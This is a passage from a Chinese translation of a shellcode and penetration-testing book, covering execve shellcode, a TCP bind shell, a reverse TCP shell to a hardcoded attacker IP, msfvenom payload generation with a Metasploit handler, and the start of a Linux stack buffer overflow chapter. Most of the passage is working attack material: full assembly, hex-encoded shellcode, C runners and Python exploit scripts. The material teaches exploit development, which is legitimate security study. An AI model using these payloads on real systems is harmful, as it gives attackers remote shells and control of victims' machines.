section .text

_start:
    xor rax, rax
    push rax
    mov rdx, rsp
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi,rsp
    add rax, 59
    syscall
```

现在运行以下命令：

```
$ nasm -felf64 execve.nasm -o execve.o
$ ld execve.o -o execve $ ./execve
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00202.jpeg)

让我们将其转换为 shellcode：

```
$ objdump -M intel -D execve | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00203.jpeg)

我们将使用 C 代码来注入我们的 shellcode：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
int main()
{
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

现在运行以下命令：

```
$ gcc -fno-stack-protector -z execstack execve.c
$ ./a.out
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00204.jpeg)

# TCP 绑定 shell

现在，让我们进一步做一些真正有用的事情，即构建一个 TCP 绑定 shell。

TCP 绑定 shell 用于在一台机器（受害者）上设置服务器，并且该服务器正在等待来自另一台机器（攻击者）的连接，这允许另一台机器（攻击者）在服务器上执行命令。

首先，让我们看一下 C 语言中的绑定 shell，以了解它是如何工作的：

```
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

int main(void)
{
  int clientfd, sockfd;
  int port = 1234;
  struct sockaddr_in mysockaddr;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  mysockaddr.sin_family = AF_INET; //--> can be represented in
  numeric  as 2
  mysockaddr.sin_port = htons(port);
  mysockaddr.sin_addr.s_addr = INADDR_ANY;// --> can be represented
  in  numeric as 0 which means to bind to all interfaces

  bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

  listen(sockfd, 1);

  clientfd = accept(sockfd, NULL, NULL);

  dup2(clientfd, 0);
  dup2(clientfd, 1);
  dup2(clientfd, 2);
  char * const argv[] = {"sh",NULL, NULL};
  execve("/bin/sh", argv, NULL);
  return 0;
}
```

让我们把它分解成几部分来理解它是如何工作的：

```
sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

首先，我们创建了一个套接字，它需要三个参数。第一个参数是定义协议族，即`AF_INET`，代表 IPv4，可以用`2`来表示。第二个参数是指定连接的类型，在这里，`SOCK_STREAM`代表 TCP，可以用`1`来表示。第三个参数是协议，设置为`0`，告诉操作系统选择最合适的协议来使用。现在让我们找到`socket`系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep socket
```

上述命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00205.jpeg)

从获得的输出中，`socket`系统调用号是`41`。

让我们在汇编中创建第一部分：

```
xor rax, rax
add rax, 41
xor rdi, rdi
add rdi, 2
xor rsi, rsi
inc rsi
xor rdx, rdx
syscall
```

输出值，即`sockfd`，将被存储在 RAX 寄存器中；让我们将其移到 RDI 寄存器中：

```
mov rdi, rax
```

现在到下一部分，即填充`mysockaddr`结构以作为`bind`函数的输入：

```
 sockfd = socket(AF_INET, SOCK_STREAM, 0);
 mysockaddr.sin_family = AF_INET;
 mysockaddr.sin_port = htons(port);
 mysockaddr.sin_addr.s_addr = INADDR_ANY;
```

我们需要以指针的形式；而且，我们必须以相反的顺序推送到堆栈。

首先，我们推送`0`来表示绑定到所有接口（4 字节）。

其次，我们以`htons`形式推送端口（2 字节）。要将我们的端口转换为`htons`，我们可以使用 Python：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00206.jpeg)

这是我们的端口（`1234`）以`htons`形式（`0xd204`）。

第三，我们推送值`2`，表示`AF_INET`（2 字节）：

```
xor rax, rax 
push rax
push word 0xd204
push word 0x02
```

有了我们的结构设置，让我们准备`bind`函数：

```
bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
```

`bind`函数需要三个参数。第一个是`sockfd`，已经存储在 RDI 寄存器中；第二个是我们的结构以引用的形式；第三个是我们结构的长度，即`16`。现在剩下的是获取`bind`系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep bind
```

上述命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00207.jpeg)

从上述截图中，我们可以看到`bind`系统调用号是`49`；让我们创建`bind`系统调用：

```
mov rsi, rsp
xor rdx, rdx
add rdx, 16
xor rax, rax
add rax, 49
syscall
```

现在，让我们设置`listen`函数，它需要两个参数：

```
listen(sockfd, 1);
```

第一个参数是`sockfd`，我们已经将其存储在 RDI 寄存器中。第二个参数是一个数字，表示服务器可以接受的最大连接数，在这里，它只允许一个。

现在，让我们获取`listen`系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep listen
```

上述命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00208.jpeg)

现在，让我们构建`bind`系统调用：

```
xor rax, rax
add rax, 50
xor rsi , rsi
inc rsi 
syscall
```

我们将继续下一个函数，即`accept`：

```
 clientfd = accept(sockfd, NULL, NULL);
```

`accept`函数需要三个参数。第一个是`sockfd`，同样，它已经存储在 RDI 寄存器中；我们可以将第二个和第三个参数设置为零。让我们获取`accept`系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep accept
```

上述命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00209.jpeg)

```
xor rax , rax
add rax, 43
xor rsi, rsi
xor rdx, rdx
syscall
```

`accept`函数的输出，即`clientfd`，将被存储在 RAX 寄存器中，所以让我们把它移到一个更安全的地方：

```
mov rbx, rax
```

执行`dup2`系统调用：

```
 dup2(clientfd, 0);
 dup2(clientfd, 1);
 dup2(clientfd, 2);
```

现在，我们将执行它三次，将我们的文件描述符复制到`stdin`，`stdout`和`stderr`，分别为（`0`，`1`，`1`）。

`dup2`系统调用需要两个参数。第一个参数是旧文件描述符，在我们的情况下是`clientfd`。第二个参数是我们的新文件描述符（`0`，`1`，`2`）。现在，让我们获取`dup2`系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep dup2
```

上述命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00210.jpeg)

现在，让我们构建`dup2`系统调用：

```
mov rdi, rbx
xor rax,rax
add rax, 33
xor rsi, rsi
syscall

xor rax,rax
add rax, 33
inc rsi
syscall

xor rax,rax
add rax, 33
inc rsi
syscall
```

然后，我们添加我们的`execve`系统调用：

```
char * const argv[] = {"sh",NULL, NULL};
execve("/bin/sh", argv, NULL);
return 0;

xor rax, rax
push rax
mov rdx, rsp
mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi, rsp
push rax
push rdi
mov rsi,rsp
add rax, 59
syscall
```

现在，一切都准备就绪；让我们把所有的部分放在一起写成一段代码：

```
global _start

section .text

_start:

;Socket syscall
    xor rax, rax
    add rax, 41
    xor rdi, rdi
    add rdi, 2
    xor rsi, rsi
    inc rsi
    xor rdx, rdx
    syscall

; Save the sockfd in RDI Register 
    mov rdi, rax

;Creating the structure 
    xor rax, rax 
    push rax
    push word 0xd204
    push word 0x02
;Bind syscall
    mov rsi, rsp
    xor rdx, rdx
    add rdx, 16
    xor rax, rax
    add rax, 49
    syscall

;Listen syscall
    xor rax, rax
    add rax, 50
    xor rsi , rsi
    inc rsi
    syscall

;Accept syscall
    xor rax , rax
    add rax, 43
    xor rsi, rsi
    xor rdx, rdx
    syscall

;Store clientfd in RBX register 
    mov rbx, rax

;Dup2 syscall to stdin
    mov rdi, rbx
    xor rax,rax
    add rax, 33
    xor rsi, rsi
    syscall

;Dup2 syscall to stdout
    xor rax,rax
    add rax, 33
    inc rsi
    syscall

;Dup2 syscall to stderr
    xor rax,rax
    add rax, 33
    inc rsi
    syscall

;Execve syscall with /bin/sh
    xor rax, rax
    push rax
    mov rdx, rsp
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi,rsp
    add rax, 59
    syscall
```

让我们汇编和链接它：

```
$ nasm -felf64 bind-shell.nasm -o bind-shell.o
$ ld bind-shell.o -o bind-shell
```

让我们将其转换为 shellcode：

```
$ objdump -M intel -D bind-shell | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

上述命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00211.jpeg)

让我们将其注入到我们的 C 代码中：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] =

"\x48\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\xff\xc6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x66\x68\x04\xd2\x66\x6a\x02\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x48\x31\xc0\x48\x83\xc0\x31\x0f\x05\x48\x31\xc0\x48\x83\xc0\x32\x48\x31\xf6\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x2b\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc3\x48\x89\xdf\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
 {
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

让我们编译并运行它：

```
$ gcc -fno-stack-protector -z execstack bind-shell.c
$ ./a.out
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00212.gif)

现在我们的 shellcode 已经在工作并等待；让我们确认一下：

```
$ netstat -ntlp
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00213.jpeg)

它现在在端口 `1234` 上监听；现在，从另一个终端窗口，启动 `nc`：

```
$ nc localhost 1234
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00214.gif)

现在，它已连接并等待我们的命令；让我们试试：

```
$ cat /etc/issue
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00215.gif)

现在我们有了我们的第一个真正的 shellcode！

# 反向 TCP shell

在本节中，我们将创建另一个有用的 shellcode，即反向 TCP shell。反向 TCP shell 是绑定 TCP 的相反，因为受害者的机器再次建立与攻击者的连接。

首先，在 C 代码中让我们看一下它：

```
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h> 

int main(void)
{
    int sockfd;
    int port = 1234;
    struct sockaddr_in mysockaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    mysockaddr.sin_family = AF_INET;
    mysockaddr.sin_port = htons(port);
    mysockaddr.sin_addr.s_addr = inet_addr("192.168.238.1");

    connect(sockfd, (struct sockaddr *) &mysockaddr,
    sizeof(mysockaddr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
```

首先，我们将在我们的受害者机器之一（Ubuntu）上编译并执行它。我们将在攻击机器（Kali）上设置一个监听器，然后 shell 将从 Ubuntu 连接回 Kali，通过在代码中添加 Kali 的 IP。

在 Kali 上使用 `nc` 命令或 `netcat` 工具设置一个监听器：

```
$ nc -lp 1234
```

在 Ubuntu 上，让我们编译并运行我们的 `reverse-tcp` shellcode：

```
$ gcc reverse-tcp.c -o reverse-tcp
$ ./reverse-tcp
```

再次回到我的 Kali —— 我连接上了！

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00216.gif)

这就是简单的！

现在，让我们在汇编中构建一个反向 TCP shell，然后将其转换为一个 shellcode。

`socket` 函数与我们在绑定 TCP 中解释的一样。将 `socket` 的输出移动到 RDI 寄存器中：

```
xor rax, rax
add rax, 41
xor rdi, rdi
add rdi, 2
xor rsi, rsi
inc rsi
xor rdx, rdx
syscall

mov rdi, rax
```

接下来是填充 `mysockaddr` 结构，除了我们必须以 32 位打包格式推出攻击者的 IP 地址。我们将使用 Python 来做到这一点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00217.gif)

所以我们的 IP 地址以 32 位打包格式是 `01eea8c0`。

让我们构建我们的结构并将栈指针移动到 RSI：

```
xor rax, rax 
push dword 0x01eea8c0
push word 0xd204
push word 0x02

mov rsi, rsp
```

现在，让我们构建 `connect` 函数：

```
 connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
```

然后，运行以下命令：

```
$ man 2 connect
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00218.gif)

`connect` 函数也接受三个参数。第一个参数是 `sockfd`（来自 `socket` 函数的输出），存储在 RDI 寄存器中。第二个是我们结构的引用，存储在 RSI 寄存器中。第三个参数是我们结构的大小。

让我们获取 `connect` 系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep connect
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00219.gif)

从获得的输出中，我们可以看到系统调用号是 `42`。现在，让我们构建 `connect` 系统调用：

```
xor rdx, rdx
add rdx, 16
xor rax, rax
add rax, 42
syscall
```

现在，`dup2` 函数与之前的相同，只是第一个参数将是 `sockfd`，它已经存储在 RDI 寄存器中；让我们也构建它：

```
xor rax,rax
add rax, 33
xor rsi, rsi
syscall

xor rax,rax
add rax, 33
inc rsi
syscall

xor rax,rax
add rax, 33
inc rsi
syscall
```

现在是最后一部分，即 `/bin/sh` 的 `execve` 系统调用：

```
xor rax, rax
push rax
mov rdx, rsp
mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi, rsp
push rax
push rdi
mov rsi,rsp
add rax, 59
syscall
```

现在，让我们把它们打包在一起：

```
global _start

section .text

_start:

;Socket syscall
    xor rax, rax
    add rax, 41
    xor rdi, rdi
    add rdi, 2
    xor rsi, rsi
    inc rsi
    xor rdx, rdx
    syscall

; Save the sockfd in RDI Register
    mov rdi, rax

;Creating the structure
    xor rax, rax 
    push dword 0x01eea8c0
    push word 0xd204
    push word 0x02

;Move stack pointer to RSI
    mov rsi, rsp

;Connect syscall
    xor rdx, rdx
    add rdx, 16
    xor rax, rax
    add rax, 42
    syscall

;Dup2 syscall to stdin
    xor rax,rax
    add rax, 33
    xor rsi, rsi
    syscall

;Dup2 syscall to stdout
    xor rax,rax
    add rax, 33
    inc rsi
    syscall

;Dup2 syscall to stderr
    xor rax,rax
    add rax, 33
    inc rsi
    syscall

;Execve syscall with /bin/sh
    xor rax, rax
    push rax
    mov rdx, rsp
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi,rsp
    add rax, 59
    syscall
```

让我们将其汇编和链接到我们的受害者机器上：

```
$ nasm -felf64 reverse-tcp.nasm -o reverse-tcp.o
$ ld reverse-tcp.o -o reverse-tcp
```

然后，在我们的攻击者机器上运行以下命令：

```
$ nc -lp 1234
```

然后，再回到我们的受害者机器并运行我们的代码：

```
$ ./reverse-tcp
```

然后，在我们的攻击者机器上，我们连接到了受害者机器（Ubuntu）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00220.gif)

现在，让我们将其转换为一个 shellcode：

```
$ objdump -M intel -D reverse-tcp | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00221.jpeg)

让我们将这个机器语言复制到我们的 C 代码中：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] =

"\x48\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\xff\xc6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x68\xc0\xa8\xee\x01\x66\x68\x04\xd2\x66\x6a\x02\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x48\x31\xc0\x48\x83\xc0\x2a\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
 {
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

让我们在我们的受害者机器上编译它：

```
$ gcc -fno-stack-protector -z execstack reverse-tcp-shellcode.c -o reverse-tcp-shellcode
```

然后，在我们的攻击者机器上设置一个监听器：

```
$ nc -lp 1234
```

现在，在我们的受害者机器上设置一个监听器：

```
$ ./reverse-tcp-shellcode
```

前面命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00222.jpeg)

现在，我们连接到了攻击者的机器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00223.gif)

我们成功了！

# 使用 Metasploit 生成 shellcode

在这里，事情比你想象的简单。我们将使用 Metasploit 为多个平台和多个架构生成 shellcode，并在一个命令中删除坏字符。

我们将使用 `msfvenom` 命令。让我们使用 `msfvenom -h` 显示所有选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00224.gif)

让我们使用`msfvenom -l`列出所有的有效载荷-这是一个非常庞大的有效载荷列表：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00225.gif)

这只是列表中的一个小部分。

让我们使用`msfvenom --help-formats`来查看输出格式：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00226.jpeg)

让我们尝试在 Linux 上创建绑定 TCP shellcode：

```
$ msfvenom -a x64 --platform linux -p linux/x64/shell/bind_tcp -b "\x00" -f c
```

这里很简单：`-a`指定架构，然后我们指定平台为 Linux，然后选择我们的有效载荷为`linux/x64/shell/bind_tcp`，然后使用`-b`选项去除不良字符`\x00`，最后我们指定格式为 C。让我们执行一下看看：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00227.jpeg)

现在，将那个 shellcode 复制到我们的 C 代码中：

```
#include<stdio.h>
#include<string.h>
unsigned char code[] =
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xdd\x0a\x08\xe9\x70\x39\xf7\x21\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb7\x23\x50\x70\x1a\x3b"
"\xa8\x4b\xdc\x54\x07\xec\x38\xae\xa5\xe6\xd9\x2e\x0a\xe9\x61"
"\x65\xbf\xa8\x3b\x60\x18\xb3\x1a\x08\xaf\x2e\xd8\x53\x62\xdb"
"\x28\x36\xf2\x69\x4b\x60\x23\xb1\x7f\x3c\xa7\x77\x82\x60\x01"
"\xb1\xe9\x8f\xe7\x69\x54\xdc\x45\xd8\xb9\x53\xd5\x60\x87\xb8"
"\x0f\xe6\x75\x71\x61\x69\x4a\x55\x07\xec\x8f\xdf\xf7\x21";

int main()
{
     printf("Shellcode Length: %d\n", (int)strlen(code));
     int (*ret)() = (int(*)())code;
     ret();
}
```

然后，将其复制到我们的受害者机器上。现在，编译并运行它：

```
$ gcc -fno-stack-protector -z execstack bin-tcp-msf.c -o bin-tcp-msf
$ ./bin-tcp-msf
```

它正在等待连接。现在，让我们在攻击者机器上使用 Metasploit Framework 和`msfconsole`命令设置我们的监听器，然后选择处理程序：

```
use exploit/multi/handler
```

然后，我们使用这个命令选择我们的有效载荷：

```
set PAYLOAD linux/x64/shell/bind_tcp
```

现在，我们指定受害者机器的 IP：

```
set RHOST 192.168.238.128
```

然后，我们指定端口- Metasploit 的默认端口是`4444`：

```
set LPORT 4444
```

现在，我们运行我们的处理程序：

```
exploit
```

上述命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00228.jpeg)

它说会话在`session 1`上是活动的。让我们使用`session 1`激活这个会话：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00229.jpeg)

成功了！

# 总结

在本章中，我们学习了如何创建简单的 shellcode 以及如何去除不良字符。我们继续使用`execve`执行系统命令。然后，我们构建了高级的 shellcode，比如绑定 TCP shell 和反向 TCP shell。最后，我们看到了如何使用 Metasploit Framework 在一行中构建 shellcode 以及如何使用 Metasploit 设置监听器。

我们现在确切地知道如何构建有效载荷，所以我们将看看如何使用它们。在下一章中，我们将讨论缓冲区溢出攻击。


# 第六章：缓冲区溢出攻击

在本章中，我们将更深入地探讨缓冲区溢出攻击。我们将看到如何改变执行流程，并且看一些非常简单的方法来注入 shellcode。我们开始吧？

# Linux 上的堆栈溢出

现在，我们即将学习什么是缓冲区溢出，并且我们将了解如何改变执行流程，使用一个有漏洞的源代码。

我们将使用以下代码：

```
int copytobuffer(char* input)
{
    char buffer[15];
    strcpy (buffer,input);
    return 0;
}
void main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    exit(0);
}
```

好的，让我们稍微调整一下，做一些更有用的事情：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int copytobuffer(char* input)
{
    char buffer[15];
    strcpy (buffer,input);
    return 0;
}

void letsprint()
{
    printf("Hey!! , you succeeded\n");
    exit(0);
}

void main (int argc, char *argv[])
{
   int local_variable = 1;
   copytobuffer(argv[1]);
   exit(0);
}
```

在这里，我们添加了一个新函数`letsprint`，其中包含`printf`，由于这个函数从未在`main`函数中被调用过，它将永远不会被执行。那么，如果我们使用这个缓冲区溢出来控制执行并改变流程来执行这个函数呢？

现在，让我们在我们的 Ubuntu 机器上编译并运行它：

```
$ gcc -fno-stack-protector -z execstack buffer.c -o buffer
$ ./buffer aaaa
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00230.jpeg)

如你所见，什么都没有发生。让我们尝试造成溢出：

```
 $ ./buffer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00231.jpeg)

好的，现在让我们试着在我们的 GDB 中获取那个错误：

```
$ gdb ./buffer
```

然后，让我们在`main`函数处设置一个断点，暂停执行在`main`函数处：

```
$ break main
```

现在，程序开始。它将在`main`函数处暂停。使用 24 个`a`字符作为输入继续：

```
$ run aaaaaaaaaaaaaaaaaaaaaaaa
```

然后，代码将在`main`处暂停：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00232.jpeg)

按下*C*和*Enter*键继续执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00233.jpeg)

程序如预期地崩溃了，所以让我们尝试输入 26 个`a`字符：

```
$ run aaaaaaaaaaaaaaaaaaaaaaaaaa
```

你可以使用 Python 生成输入，而不是计算字符数：

```
#!/usr/bin/python

buffer = ''
buffer += 'a'*26
f = open("input.txt", "w")
f.write(buffer)
```

然后，给予它执行权限并执行它：

```
$ chmod +x exploit.py
$ ./exploit.py
```

在 GDB 中，运行以下命令：

```
$ run $(cat input.txt)
```

然后，代码将在`main`处暂停：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00234.jpeg)

按下*C*然后*Enter*继续执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00235.jpeg)

你注意到`??()`中的错误`0x0000000000006161`了吗？从前面的截图中，程序不知道`0x0000000000006161`在哪里，`6161`是`aa`，这意味着我们能够向 RIP 寄存器注入 2 个字节，这就是我如何在 24 个字符后开始的。别担心，我们将在下一章中讨论这个问题。

让我们确认一下，使用 24 个`a`字符和 6 个`b`字符：

```
$ run aaaaaaaaaaaaaaaaaaaaaaaabbbbbb
```

我们也可以使用 Python：

```
#!/usr/bin/python

buffer = ''
buffer += 'a'*24
buffer += 'b'*6
f = open("input.txt", "w")
f.write(buffer)
```

然后，执行利用以生成新的输入：

```
$ ./exploit
```

之后，在 GDB 中运行以下命令：

```
$ run $(cat input.txt)
```

然后，代码将触发断点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00236.jpeg)

按下*C*然后*Enter*继续：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00237.jpeg)

现在，通过查看错误，我们看到我们注入的`b`字符在里面。在这一点上，我们做得很好。现在我们知道了我们的注入形式，让我们尝试使用`disassemble`命令执行`letsprint`函数：

```
$ disassemble letsprint
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00238.jpeg)

我们得到了`letsprint`函数中的第一条指令，`push rbp`，地址为`0x00000000004005e3`，我们需要的是真实地址；我们也可以使用`print`命令来获取地址：

```
$ print letsprint
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00239.jpeg)

现在我们有了地址，让我们尝试使用 Python 构建我们的利用，因为我们不能直接传递地址：

```
#!/usr/bin/python
from struct import *

buffer = ''
buffer += 'a'*24
buffer += pack("<Q", 0x0000004005e3)
f = open("input.txt", "w")
f.write(buffer)
```

然后，我们执行它以生成新的输入：

```
$ ./exploit
```

现在，在 GDB 中，运行以下命令：

```
$ run $(cat input.txt)
```

然后，它将触发断点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00240.jpeg)

按下*C*然后*Enter*继续：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00241.jpeg)

我们做到了！现在，让我们从我们的 shell 中确认，而不是从 GDB 中确认：

```
$ ./buffer $(cat input.txt)
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00242.jpeg)

是的，我们改变了执行流程，执行了本不应该执行的东西！

让我们再试一个有趣的有效载荷。我们将使用我们的代码：

```
int copytobuffer(char* input)
 {
     char buffer[15];
     strcpy (buffer,input);
     return 0;
 }

void main (int argc, char *argv[])
 {
     int local_variable = 1;
     copytobuffer(argv[1]);
     exit(0);
 }
```

但我们将在这里添加我们的`execve`系统调用来从上一章运行`/bin/sh`：

```
unsigned char code[] =
 "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
 {
     printf("Shellcode Length: %d\n", (int)strlen(code));
     int (*ret)() = (int(*)())code;
     ret();
 }
```

让我们把它们放在一起：

```
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>

 void shell_pwn()
 {
    char code[] =
     "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73
     \x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
 }
 int copytobuffer(char* input)
 {
     char buffer[15];
     strcpy (buffer,input);
     return 0;
 }

 void main (int argc, char *argv[])
 {
     int local_variable = 1;
     copytobuffer(argv[1]);
     exit(0);
 }
```

